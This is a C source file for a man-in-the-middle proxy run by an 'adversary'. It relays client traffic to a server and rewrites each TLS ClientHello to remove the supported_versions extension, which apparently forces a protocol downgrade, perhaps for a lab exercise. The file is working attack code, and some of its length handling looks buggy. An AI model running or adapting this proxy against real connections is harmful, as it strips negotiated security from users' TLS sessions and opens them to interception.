#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>
#include <resolv.h>
#include <netdb.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/socket.h>

#define BUF_SIZE 16384
#define SERVER_NAME "www.bob.com"
#define MAX_THREADS 100
#define TIMEOUT 3000

int open_listener(int port);
int open_connection(const char *domain, int port);
int modify_message(uint8_t *buf, int len);
void init_thread_config();
int get_thread_index();

void *run(void *rinfo);

pthread_t threads[MAX_THREADS];
pthread_attr_t attr;

struct rinfo
{
  int client;
  char *port;
};

int main(int argc, char *argv[])
{
  if (argc != 3)
  {
    printf("Usage: %s <adversary port> <server port>\n", argv[0]);
    exit(0);
  }

  char *adversary_port, *server_port;
  uint8_t buf[BUF_SIZE];
  int client, adversary, tidx, rc;
  void *status;

  adversary_port = argv[1];
  server_port = argv[2];

  adversary = open_listener(atoi(adversary_port));

  struct sockaddr_in addr;
  socklen_t len = sizeof(addr);

  init_thread_config();

  while (1)
  {
    // printf("Waiting for the client\n");
    if ((client = accept(adversary, (struct sockaddr *)&addr, &len)) > 0)
    {
      printf("Accept a new connection from a client\n");
      struct rinfo *rinfo = (struct rinfo *)malloc(sizeof(struct rinfo));
      rinfo->client = client;
      rinfo->port = server_port;
      tidx = get_thread_index();
      rc = pthread_create(&threads[tidx], &attr, run, rinfo);

      if (rc < 0)
      {
        printf("Error in pthread creation\n");
        exit(1);
      }
      
      pthread_attr_destroy(&attr);

      rc = pthread_join(threads[tidx], &status);

      if (rc)
      {
        printf("Error in join\n");
        exit(1);
      }
    }
  }

  return 0;
}

void *run(void *rinfo)
{
  int server, client;
  uint8_t buf[BUF_SIZE];
  int sent, rcvd, offset, port, maxfd;
  struct rinfo *info = (struct rinfo *)rinfo;

  port = atoi(info->port);
  server = open_connection(SERVER_NAME, port);
  client = info->client;

  fd_set fds;
  struct timeval tv;
  FD_ZERO(&fds);
  FD_SET(server, &fds);

  while (1)
  {
    printf("1\n");
    if ((rcvd = read(client, buf, BUF_SIZE)) > 0)
    {
      rcvd = modify_message(buf, rcvd);
      printf("1-1: rcvd: %d\n", rcvd);
      sent = 0;
      printf("1-2: sent: %d\n", sent);
      while (sent < rcvd)
      {
        printf("1-3: before sent\n");
        offset = write(server, buf + sent, rcvd - sent);
        printf("1-4: after sent: %d\n", offset);
        if (offset > 0)
          sent += offset;
        printf("1-5: sent: %d\n", sent);
      }
    }

    printf("2\n");
    if (rcvd == 0)
    {
      close(client);
      close(server);
      break;
    };

    printf("3\n");
    if ((rcvd = read(server, buf, BUF_SIZE)) > 0)
    {
      printf("3-1\n");
      sent = 0;
      while (sent < rcvd)
      {
        printf("3-2\n");
        offset = write(client, buf + sent, rcvd - sent);
        printf("3-3\n");
        if (offset > 0)
          sent += offset;
        printf("3-4\n");
      }
    }
  }

  return NULL;
}

int open_listener(int port)
{   
  int sd;
	struct sockaddr_in addr;
  int enable;
  int flags;

	sd = socket(PF_INET, SOCK_STREAM, 0);
	enable = 1;
  if (setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(int)) < 0)
  {
    perror("setsockopt(SO_REUSEADDR) failed");
    abort();
  }

//  flags = fcntl(sd, F_GETFL, 0);
//  fcntl(sd, F_SETFL, flags | O_NONBLOCK);
	bzero(&addr, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = INADDR_ANY;
	if ( bind(sd, (struct sockaddr*)&addr, sizeof(addr)) != 0 )
	{
		perror("can't bind port");
		abort();
	}
	if ( listen(sd, 30) != 0 )
	{
		perror("Can't configure listening port");
		abort();
	}
	return sd;
}

int open_connection(const char *domain, int port)
{   
  int sd, flags;
  struct hostent *host;
  struct sockaddr_in addr;
            
  if ( (host = gethostbyname(domain)) == NULL )
  {
    perror(domain);
    abort();
  }
    
  sd = socket(PF_INET, SOCK_STREAM, 0);
//  flags = fcntl(sd, F_GETFL, 0);
//  fcntl(sd, F_SETFL, flags | O_NONBLOCK);

  bzero(&addr, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_port = htons(port);
  addr.sin_addr.s_addr = *(long*)(host->h_addr);

  connect(sd, (struct sockaddr*)&addr, sizeof(addr));
/*
  if ( connect(sd, (struct sockaddr*)&addr, sizeof(addr)) != 0 )
  {
    close(sd);
    perror(domain);
    abort();
  }
*/
         
  return sd;
}

int modify_message(uint8_t *buf, int len)
{
  int content_type, handshake_type, detected, padding;
  uint32_t length, tot_len, ch_len, ext_len, tmp_len, sv_len;
  int ret, tmp, ext, ext_tmp;
  uint8_t *p, *q, *final, *tot_len_ptr, *ch_len_ptr, *ext_len_ptr, *start, *end;
  ret = len;
  tot_len = 0; ch_len = 0; ext_len = 0; sv_len = 0;
  detected = 0;
  padding = 0;

  int i=0;
  printf("===== Before (%d bytes) =====\n", ret);
  for (i=0; i<ret; i++)
  {
    if (i % 20 == 0)
    {
      printf("\n");
    }
    printf("%02X ", buf[i]);
  }
  printf("\n=============================\n\n");

  p = buf;
  final = buf + len;
  content_type = *(p++);
  if (content_type != 0x16) goto out;
  p += 2; // Version (0x0301)
  tot_len_ptr = p; // The total length will be finally revised;
  tot_len |= (*(p++) << 8) | *(p++);
  printf("Total length: %u\n", tot_len);

  handshake_type = *(p++);
  if (handshake_type != 0x1) goto out;
  ch_len_ptr = p;
  ch_len |= (*(p++) << 16) | (*(p++) << 8) | (*p++);
  p += 2;       // Version (0x0303)
  p += 32;      // Random (32 bytes)
  tmp = *(p++); // Session ID length
  p += tmp;     // Session ID
  tmp = (*(p++) << 8) | *(p++); // Ciphersuite bytes
  p += tmp;     // Ciphersuites
  tmp = *(p++); // Compression Method bytes
  p += tmp;     // Compression Methods

  printf("ClientHello Length: %d\n", ch_len);

  ext_len_ptr = p;
  ext_len = (*(p++) << 8) | *(p++);
  printf("Extension Length: %d\n", ext_len);

  tmp_len = ext_len;
  while (tmp_len > 0)
  {
    q = p;
    ext = (*(q++) << 8) | *(q++);
    tmp_len -= 2;
    ext_tmp = (*(q++) << 8) | *(q++);
    tmp_len -= 2;
    q += ext_tmp;
    tmp_len -= ext_tmp;
    printf("Extension: %d\n", ext);
    printf("Length: %d\n", ext_tmp);
    if (ext == 43)
    {
      printf("Supported Version Detected\n");
      detected = 1;
      sv_len = ext_tmp + 4;
      printf("Supported Version Length: %d\n", sv_len);
      start = p;
      end = q;

      tot_len -= sv_len;
      ch_len -= sv_len;
      ext_len -= sv_len;
    }
    else if (ext == 21)
    {
      printf("Padding Detected\n");
      printf("Padding Length: %d\n", ext_tmp);
      printf("This should be changed to %d\n", ext_tmp + sv_len);
      q = q - ext_tmp - 2;
      *(q++) = ((ext_tmp + sv_len) >> 8) & 0xff;
      *(q++) = (ext_tmp + sv_len) & 0xff;
      q += ext_tmp;
      memset(q, 0x0, sv_len);
      padding = 1;
    }
    p = q;
  }

  if (detected)
  {
    memmove(start, end, final - end);

    if (!padding)
    {
      *(tot_len_ptr) = (tot_len >> 8) & 0xff;
      *(tot_len_ptr + 1) = tot_len & 0xff;

      *(ch_len_ptr) = (ch_len >> 16) & 0xff;
      *(ch_len_ptr + 1) = (ch_len >> 8) & 0xff;
      *(ch_len_ptr + 2) = ch_len & 0xff;

      *(ext_len_ptr) = (ext_len >> 16) & 0xff;
      *(ext_len_ptr + 1) = (ext_len >> 8) & 0xff;
      *(ext_len_ptr + 2) = ext_len & 0xff;

      tmp = 0;
      tmp = (*(ch_len_ptr) << 16) | (*(ch_len_ptr + 1) << 8) | *(ch_len_ptr + 2);

      tmp = 0;
      tmp = (*(ext_len_ptr) << 16) | (*(ext_len_ptr + 1) << 8) | *(ext_len_ptr + 2);
      ret -= sv_len;
    }
  }

  printf("===== After (%d bytes) =====\n", ret);
  for (i=0; i<ret; i++)
  {
    if (i % 20 == 0)
    {
      printf("\n");
    }
    printf("%02X ", buf[i]);
  }
  printf("\n=============================\n\n");

out:
  return ret;
}

void init_thread_config(void)
{
  pthread_attr_init(&attr);
  pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE);
}

int get_thread_index(void)
{
  int i, ret = -1;

  for (i=0; i<MAX_THREADS; i++)
  {
    if (!threads[i])
    {
      ret = i;
      break;
    }
  }

  return ret;
}
